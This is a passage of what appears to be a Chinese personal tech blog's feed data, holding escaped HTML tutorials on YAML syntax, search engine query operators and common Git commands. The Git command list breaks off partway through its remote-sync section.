class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?  </span><br><span class="line">    - complexkey1</span><br><span class="line">    - complexkey2</span><br><span class="line">:</span><br><span class="line">    - complexvalue1</span><br><span class="line">    - complexvalue2</span><br></pre></td></tr></table></figure><p>意思即对象的属性是一个数组 [complexkey1,complexkey2]，对应的值也是一个数组 [complexvalue1,complexvalue2]</p><h2 id="YAML-数组"><a href="#YAML-数组" class="headerlink" title="YAML 数组"></a>YAML 数组</h2><p>以 <strong>-</strong> 开头的行表示构成一个数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- A</span><br><span class="line">- B</span><br><span class="line">- C</span><br></pre></td></tr></table></figure><p>YAML 支持多维数组，可以使用行内表示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: [value1, value2, ...]</span><br></pre></td></tr></table></figure><p>数据结构的子成员是一个数组，则可以在该项下面缩进一个空格。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-</span><br><span class="line"> - A</span><br><span class="line"> - B</span><br><span class="line"> - C</span><br></pre></td></tr></table></figure><p>一个相对复杂的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">companies:</span><br><span class="line">    -</span><br><span class="line">        id: 1</span><br><span class="line">        name: company1</span><br><span class="line">        price: 200W</span><br><span class="line">    -</span><br><span class="line">        id: 2</span><br><span class="line">        name: company2</span><br><span class="line">        price: 500W</span><br></pre></td></tr></table></figure><p>意思是 companies 属性是一个数组，每一个数组元素又是由 id、name、price 三个属性构成。</p><p>数组也可以使用流式(flow)的方式表示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">companies: [&#123;id: 1,name: company1,price: 200W&#125;,&#123;id: 2,name: company2,price: 500W&#125;]</span><br></pre></td></tr></table></figure><h2 id="复合结构（对象和数组组合）"><a href="#复合结构（对象和数组组合）" class="headerlink" title="复合结构（对象和数组组合）"></a>复合结构（对象和数组组合）</h2><p>数组和对象可以构成复合结构，例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">languages:</span><br><span class="line">  - Ruby</span><br><span class="line">  - Perl</span><br><span class="line">  - Python </span><br><span class="line">websites:</span><br><span class="line">  YAML: yaml.org </span><br><span class="line">  Ruby: ruby-lang.org </span><br><span class="line">  Python: python.org </span><br><span class="line">  Perl: use.perl.org</span><br></pre></td></tr></table></figure><p>转换为 js 为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">  languages: [ &#x27;Ruby&#x27;, &#x27;Perl&#x27;, &#x27;Python&#x27;],</span><br><span class="line">  websites: &#123;</span><br><span class="line">    YAML: &#x27;yaml.org&#x27;,</span><br><span class="line">    Ruby: &#x27;ruby-lang.org&#x27;,</span><br><span class="line">    Python: &#x27;python.org&#x27;,</span><br><span class="line">    Perl: &#x27;use.perl.org&#x27; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="纯量"><a href="#纯量" class="headerlink" title="纯量"></a>纯量</h2><p>纯量是最基本的，不可再分的值，包括：</p><ul><li>字符串</li><li>布尔值</li><li>整数</li><li>浮点数</li><li>Null</li><li>时间</li><li>日期</li></ul><p>使用一个例子来快速了解纯量的基本使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">boolean: # 布尔值</span><br><span class="line">    - TRUE  #true,True都可以</span><br><span class="line">    - FALSE  #false，False都可以</span><br><span class="line">float: # 浮点数</span><br><span class="line">    - 3.14</span><br><span class="line">    - 6.8523015e+5  #可以使用科学计数法</span><br><span class="line">int: # 整数</span><br><span class="line">    - 123</span><br><span class="line">    - 0b1010_0111_0100_1010_1110    #二进制表示</span><br><span class="line">null: # Null</span><br><span class="line">    nodeName: &#x27;node&#x27;</span><br><span class="line">    parent: ~  #使用~表示null</span><br><span class="line">string: # 字符串</span><br><span class="line">    - 哈哈 # 字符串默认不使用引号表示</span><br><span class="line">    - &#x27;Hello world&#x27;  #可以使用双引号或者单引号包裹特殊字符</span><br><span class="line">    - newline</span><br><span class="line">      newline2    #字符串可以拆成多行，每一行会被转化成一个空格</span><br><span class="line">date:</span><br><span class="line">    - 2018-02-17    #日期必须使用ISO 8601格式，即yyyy-MM-dd</span><br><span class="line">datetime: </span><br><span class="line">    -  2018-02-17T15:02:31+08:00    #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><br></pre></td></tr></table></figure><p>多行字符串可以使用保留换行符，也可以使用<code>&gt;</code>折叠换行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">this: </span><br><span class="line">  Foo</span><br><span class="line">  Bar</span><br><span class="line">that: &gt;</span><br><span class="line">  Foo</span><br><span class="line">  Bar</span><br></pre></td></tr></table></figure><p>转为js代码如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; this: &#x27;Foo\nBar\n&#x27;, that: &#x27;Foo Bar\n&#x27; &#125;</span><br></pre></td></tr></table></figure><p><code>+</code>表示保留文字块末尾的换行，<code>-</code>表示删除字符串末尾的换行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s1: </span><br><span class="line">  Foo</span><br><span class="line"> </span><br><span class="line">s2: +</span><br><span class="line">  Foo</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s3: -</span><br><span class="line">  Foo</span><br></pre></td></tr></table></figure><p>转为json代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; s1: &#x27;Foo\n&#x27;, s2: &#x27;Foo\n\n\n&#x27;, s3: &#x27;Foo&#x27; &#125;</span><br></pre></td></tr></table></figure><p>字符串之中可以插入 HTML 标记。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message: </span><br><span class="line">  &lt;p style=&quot;color: red&quot;&gt;</span><br><span class="line">    段落</span><br><span class="line">  &lt;/p&gt;</span><br></pre></td></tr></table></figure><h2 id="转换数据格式"><a href="#转换数据格式" class="headerlink" title="转换数据格式"></a>转换数据格式</h2><p>允许使用两个感叹号，强制转换数据类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e: !!str 123</span><br><span class="line">f: !!str true</span><br></pre></td></tr></table></figure><p>转换js结果同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; e: &#x27;123&#x27;, f: &#x27;true&#x27; &#125;</span><br></pre></td></tr></table></figure><h2 id="锚点引用"><a href="#锚点引用" class="headerlink" title="锚点引用"></a>锚点引用</h2><p><strong>&amp;</strong> 锚点和&lt; span class&#x3D;”marked”&gt;* 别名，可以用来引用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">defaults: &amp;defaults # 添加锚点</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br><span class="line">development:</span><br><span class="line">  database: myapp_development</span><br><span class="line">  &lt;&lt;: *defaults # &lt;&lt;表示合并，*引用锚点</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">  database: myapp_test</span><br><span class="line">  &lt;&lt;: *defaults # &lt;&lt;表示合并，*引用锚点</span><br></pre></td></tr></table></figure><p>相当于:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">defaults:</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br><span class="line">development:</span><br><span class="line">  database: myapp_development</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">  database: myapp_test</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br></pre></td></tr></table></figure><p><strong>&amp;</strong> 用来建立锚点（defaults），**&lt;&lt;** 表示合并到当前数据，<strong>*</strong> 用来引用锚点。</p><p>下面是另一个例子:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- &amp;showell Steve </span><br><span class="line">- Clark </span><br><span class="line">- Brian </span><br><span class="line">- Oren </span><br><span class="line">- *showell </span><br></pre></td></tr></table></figure><p>转为js代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ &#x27;Steve&#x27;, &#x27;Clark&#x27;, &#x27;Brian&#x27;, &#x27;Oren&#x27;, &#x27;Steve&#x27; ]</span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://yaml.org/">yaml官网</a></p><p><a href="http://nodeca.github.io/js-yaml/">yaml与js的转换demo</a></p><p><a href="https://www.ruanyifeng.com/blog/2016/07/yaml.html">菜鸟教程</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> yaml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜索引擎使用技巧</title>
      <link href="/8d5ef508.html"/>
      <url>/8d5ef508.html</url>
      
        <content type="html"><![CDATA[<p>搜索引擎相信大家经常在使用，但是有时候想搜某个信息时却搜出来一大堆不相关的（百度：你们都在看我干什么？）。下面我们来介绍几种搜索技巧，可以提升搜索效率，助你快速查资料，妈妈再也不担心我的学习了（’妈~我真的是在找学习资料’）</p><h2 id="技巧1：排除干扰项"><a href="#技巧1：排除干扰项" class="headerlink" title="技巧1：排除干扰项"></a>技巧1：排除干扰项</h2><p><strong>方式</strong>：关键词1+空格+减号+关键词2，即 <code>关键词1 -关键词2</code></p><p><strong>功能</strong>：排除一些不想要的关键词</p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">锤子 -锤子手机</span><br></pre></td></tr></table></figure><p>示例中将在搜索结果排除与<code>锤子手机</code>相关的，只显示<code>锤子</code>本来的样子。</p><blockquote><p>经过百度搜索的测试，有的关键词能排除掉，有的并不好使</p></blockquote><h2 id="技巧2：精确搜索"><a href="#技巧2：精确搜索" class="headerlink" title="技巧2：精确搜索"></a>技巧2：精确搜索</h2><p><strong>方式</strong>：给关键词加双引号，<code>&quot;关键词&quot;</code></p><p><strong>功能</strong>：只搜索引号里的字，少一个字或者把字拆开都不行</p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;达拉不崩吧&quot;</span><br></pre></td></tr></table></figure><blockquote><p>注意是英文的双引号</p></blockquote><h2 id="技巧3：指定网站内搜索"><a href="#技巧3：指定网站内搜索" class="headerlink" title="技巧3：指定网站内搜索"></a>技巧3：指定网站内搜索</h2><p><strong>方式</strong>：<code>site:域名 关键词</code></p><p><strong>功能</strong>：只搜索指定域名的内容</p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:zhihu.com 前端</span><br></pre></td></tr></table></figure><p>有一些站内自带的搜索并不好用，可以尝试这个搜索技巧。</p><h2 id="技巧4：指定文件格式"><a href="#技巧4：指定文件格式" class="headerlink" title="技巧4：指定文件格式"></a>技巧4：指定文件格式</h2><p><strong>方式</strong>：<code>filetype:文件格式 关键词</code></p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filetype:avi 你懂的</span><br></pre></td></tr></table></figure><p>常见文件格式有<code>doc</code>、<code>pdf</code>、<code>ppt</code>等</p><h2 id="技巧5：指定在标题搜索"><a href="#技巧5：指定在标题搜索" class="headerlink" title="技巧5：指定在标题搜索"></a>技巧5：指定在标题搜索</h2><p><strong>方式</strong>：<code>intitle:关键词</code></p><p><strong>功能</strong>：搜索的关键词要出现在标题当中</p><h2 id="技巧6：指定在内容中搜索"><a href="#技巧6：指定在内容中搜索" class="headerlink" title="技巧6：指定在内容中搜索"></a>技巧6：指定在内容中搜索</h2><p><strong>方式</strong>：<code>intext:关键词</code>、<code>allintext:关键词1 关键词2</code>、<code>inurl:关键词2</code></p><h2 id="技巧7：多种搜索技巧叠加使用"><a href="#技巧7：多种搜索技巧叠加使用" class="headerlink" title="技巧7：多种搜索技巧叠加使用"></a>技巧7：多种搜索技巧叠加使用</h2><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:zhihu.com 前端 intitle:js</span><br></pre></td></tr></table></figure><p>多种技巧和关键词叠加使用，中间空格隔开。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>以上搜索技巧使用的符号均是英文符号。</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技巧 </tag>
            
            <tag> 搜索引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用git命令整理</title>
      <link href="/131.html"/>
      <url>/131.html</url>
      
        <content type="html"><![CDATA[<h2 id="常用Git命令清单"><a href="#常用Git命令清单" class="headerlink" title="常用Git命令清单"></a>常用Git命令清单</h2><p>一般来说，日常使用只要记住下图6个命令，就可以了。但是熟练使用，恐怕要记住60～100个命令。</p><p><img src="https://cos.gjcloak.xyz/pigo/202209071837384.png?imageMogr2/format/webp/interlace/1/quality/80" alt="202209071837384" title="202209071837384"></p><p>下面是我整理的常用 Git 命令清单。几个专用名词的译名如下。</p><blockquote><ul><li>Workspace：工作区</li><li>Index &#x2F; Stage：暂存区</li><li>Repository：仓库区（或本地仓库）</li><li>Remote：远程仓库</li></ul></blockquote><h2 id="一、新建代码库"><a href="#一、新建代码库" class="headerlink" title="一、新建代码库"></a>一、新建代码库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 在当前目录新建一个Git代码库</span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"># 新建一个目录，将其初始化为Git代码库</span><br><span class="line">git init [project-name]</span><br><span class="line"></span><br><span class="line"># 下载一个项目和它的整个代码历史</span><br><span class="line">git clone [url]</span><br></pre></td></tr></table></figure><h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><p>Git的设置文件为<code>.gitconfig</code>，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 显示当前的Git配置</span><br><span class="line">git config --list</span><br><span class="line"></span><br><span class="line"># 编辑Git配置文件</span><br><span class="line">git config -e [--global]</span><br><span class="line"></span><br><span class="line"># 设置提交代码时的用户信息</span><br><span class="line">git config [--global] user.name &quot;[name]&quot;</span><br><span class="line">git config [--global] user.email &quot;[email address]&quot;</span><br></pre></td></tr></table></figure><h2 id="三、增加-删除文件"><a href="#三、增加-删除文件" class="headerlink" title="三、增加&#x2F;删除文件"></a>三、增加&#x2F;删除文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 添加指定文件到暂存区</span><br><span class="line">git add [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># 添加指定目录到暂存区，包括子目录</span><br><span class="line">git add [dir]</span><br><span class="line"></span><br><span class="line"># 添加当前目录的所有文件到暂存区</span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line"># 添加每个变化前，都会要求确认</span><br><span class="line"># 对于同一个文件的多处变化，可以实现分次提交</span><br><span class="line">git add -p</span><br><span class="line"></span><br><span class="line"># 删除工作区文件，并且将这次删除放入暂存区</span><br><span class="line">git rm [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># 停止追踪指定文件，但该文件会保留在工作区</span><br><span class="line">git rm --cached [file]</span><br><span class="line"></span><br><span class="line"># 改名文件，并且将这个改名放入暂存区</span><br><span class="line">git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure><h2 id="四、代码提交"><a href="#四、代码提交" class="headerlink" title="四、代码提交"></a>四、代码提交</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 提交暂存区到仓库区</span><br><span class="line">git commit -m [message]</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到仓库区</span><br><span class="line">git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"># 提交工作区自上次commit之后的变化，直接到仓库区</span><br><span class="line">git commit -a</span><br><span class="line"></span><br><span class="line"># 提交时显示所有diff信息</span><br><span class="line">git commit -v</span><br><span class="line"></span><br><span class="line"># 使用一次新的commit，替代上一次提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line">git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"># 重做上一次commit，并包括指定文件的新变化</span><br><span class="line">git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure><h2 id="五、分支"><a href="#五、分支" class="headerlink" title="五、分支"></a>五、分支</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># 列出所有本地分支</span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"># 列出所有远程分支</span><br><span class="line">git branch -r</span><br><span class="line"></span><br><span class="line"># 列出所有本地分支和远程分支</span><br><span class="line">git branch -a</span><br><span class="line"></span><br><span class="line"># 新建一个分支，但依然停留在当前分支</span><br><span class="line">git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，并切换到该分支</span><br><span class="line">git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向指定commit</span><br><span class="line">git branch [branch] [commit]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，与指定的远程分支建立追踪关系</span><br><span class="line">git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 切换到指定分支，并更新工作区</span><br><span class="line">git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"># 切换到上一个分支</span><br><span class="line">git checkout -</span><br><span class="line"></span><br><span class="line"># 建立追踪关系，在现有分支与指定的远程分支之间</span><br><span class="line">git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 合并指定分支到当前分支</span><br><span class="line">git merge [branch]</span><br><span class="line"></span><br><span class="line"># 选择一个commit，合并进当前分支</span><br><span class="line">git cherry-pick [commit]</span><br><span class="line"></span><br><span class="line"># 删除分支</span><br><span class="line">git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># 删除远程分支</span><br><span class="line">git push origin --delete [branch-name]</span><br><span class="line">git branch -dr [remote/branch]</span><br></pre></td></tr></table></figure><h2 id="六、标签"><a href="#六、标签" class="headerlink" title="六、标签"></a>六、标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 列出所有tag</span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"># 新建一个tag在当前commit</span><br><span class="line">git tag [tag]</span><br><span class="line"></span><br><span class="line"># 新建一个tag在指定commit</span><br><span class="line">git tag [tag] [commit]</span><br><span class="line"></span><br><span class="line"># 删除本地tag</span><br><span class="line">git tag -d [tag]</span><br><span class="line"></span><br><span class="line"># 删除远程tag</span><br><span class="line">git push origin :refs/tags/[tagName]</span><br><span class="line"></span><br><span class="line"># 查看tag信息</span><br><span class="line">git show [tag]</span><br><span class="line"></span><br><span class="line"># 提交指定tag</span><br><span class="line">git push [remote] [tag]</span><br><span class="line"></span><br><span class="line"># 提交所有tag</span><br><span class="line">git push [remote] --tags</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向某个tag</span><br><span class="line">git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure><h2 id="七、查看信息"><a href="#七、查看信息" class="headerlink" title="七、查看信息"></a>七、查看信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"># 显示有变更的文件</span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"># 显示当前分支的版本历史</span><br><span class="line">git log</span><br><span class="line"></span><br><span class="line"># 显示commit历史，以及每次commit发生变更的文件</span><br><span class="line">git log --stat</span><br><span class="line"></span><br><span class="line"># 搜索提交历史，根据关键词</span><br><span class="line">git log -S [keyword]</span><br><span class="line"></span><br><span class="line"># 显示某个commit之后的所有变动，每个commit占据一行</span><br><span class="line">git log [tag] HEAD --pretty=format:%s</span><br><span class="line"></span><br><span class="line"># 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件</span><br><span class="line">git log [tag] HEAD --grep feature</span><br><span class="line"></span><br><span class="line"># 显示某个文件的版本历史，包括文件改名</span><br><span class="line">git log --follow [file]</span><br><span class="line">git whatchanged [file]</span><br><span class="line"></span><br><span class="line"># 显示指定文件相关的每一次diff</span><br><span class="line">git log -p [file]</span><br><span class="line"></span><br><span class="line"># 显示过去5次提交</span><br><span class="line">git log -5 --pretty --oneline</span><br><span class="line"></span><br><span class="line"># 显示所有提交过的用户，按提交次数排序</span><br><span class="line">git shortlog -sn</span><br><span class="line"></span><br><span class="line"># 显示指定文件是什么人在什么时间修改过</span><br><span class="line">git blame [file]</span><br><span class="line"></span><br><span class="line"># 显示暂存区和工作区的差异</span><br><span class="line">git diff</span><br><span class="line"></span><br><span class="line"># 显示暂存区和上一个commit的差异</span><br><span class="line">git diff --cached [file]</span><br><span class="line"></span><br><span class="line"># 显示工作区与当前分支最新commit之间的差异</span><br><span class="line">git diff HEAD</span><br><span class="line"></span><br><span class="line"># 显示两次提交之间的差异</span><br><span class="line">git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"># 显示今天你写了多少行代码</span><br><span class="line">git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;</span><br><span class="line"></span><br><span class="line"># 显示某次提交的元数据和内容变化</span><br><span class="line">git show [commit]</span><br><span class="line"></span><br><span class="line"># 显示某次提交发生变化的文件</span><br><span class="line">git show --name-only [commit]</span><br><span class="line"></span><br><span class="line"># 显示某次提交时，某个文件的内容</span><br><span class="line">git show [commit]:[filename]</span><br><span class="line"></span><br><span class="line"># 显示当前分支的最近几次提交</span><br><span class="line">git reflog</span><br></pre></td></tr></table></figure><h2 id="八、远程同步"><a href="#八、远程同步" class="headerlink" title="八、远程同步"></a>八、远程同步</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 